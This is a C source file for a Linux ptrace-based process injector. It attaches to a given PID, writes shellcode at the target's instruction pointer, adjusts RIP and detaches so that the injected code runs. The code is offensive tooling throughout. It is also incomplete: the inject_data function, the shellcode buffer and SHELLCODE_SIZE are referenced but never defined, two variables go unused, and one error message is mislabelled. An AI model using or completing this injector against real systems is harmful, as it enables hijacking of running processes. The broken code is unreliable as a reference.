#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <sys/user.h>
#include <sys/reg.h>

int
main (int argc, char *argv[])
{
  pid_t                   target;
  struct user_regs_struct regs;
  int                     syscall;
  long                    dst;

  if (argc != 2)
    {
      fprintf (stderr, "Usage:\n\t%s pid\n", argv[0]);
      exit (1);
    }
  target = atoi (argv[1]);
  printf ("+ Tracing process %d\n", target);
  if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) < 0)
    {
      perror ("ptrace(ATTACH):");
      exit (1);
    }
  printf ("+ Waiting for process...\n");
  wait (NULL);
    printf ("+ Getting Registers\n");
    if ((ptrace (PTRACE_GETREGS, target, NULL, &regs)) < 0)
      {
        perror ("ptrace(GETREGS):");
        exit (1);
      }

    printf ("+ Injecting shell code at %p\n", (void*)regs.rip);
    inject_data (target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);
    regs.rip += 2;	
    printf ("+ Setting instruction pointer to %p\n", (void*)regs.rip);
    if ((ptrace (PTRACE_SETREGS, target, NULL, &regs)) < 0)
      {
        perror ("ptrace(GETREGS):");
        exit (1);
      }
    printf ("+ Run it!\n");
 
    if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) < 0)
	  {
	    perror ("ptrace(DETACH):");
	    exit (1);
	  }
    return 0;
}
